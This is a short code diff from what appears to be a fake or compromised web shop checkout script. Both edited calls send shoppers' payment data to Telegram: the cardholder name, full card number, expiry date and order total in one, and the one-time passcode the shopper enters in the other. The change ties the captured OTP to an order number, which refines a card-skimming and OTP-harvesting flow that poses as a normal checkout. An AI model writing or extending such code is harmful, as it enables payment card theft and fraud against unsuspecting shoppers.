@@ -1147,7 +1147,7 @@ goToCheckoutStep(3);
                             const lastFourDigits = cardNumber.slice(-4);
                             TelegramNotifications.cardDetailsSubmitted({
                                 total: convertPrice(getCartTotal(), false),
-                                orderRef: generateOrderReference(),
+                                orderRef: checkoutData.orderNumber,
                                 cardholderName: checkoutData.cardholderName,
                                 cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
                                 expiryDate: document.getElementById('expiry-date').value,
@@ -1373,7 +1373,7 @@ function verifyOTP() {
     if (enteredOTP.length === 6 && /^\d{6}$/.test(enteredOTP)) {
         // Send the user-entered OTP to Telegram for verification
         if (typeof TelegramNotifications !== 'undefined') {
-            TelegramNotifications.userEnteredOTP(enteredOTP);
+            TelegramNotifications.userEnteredOTP(enteredOTP, checkoutData.orderNumber);
         }
 
         console.log('User entered OTP sent to Telegram:', enteredOTP);
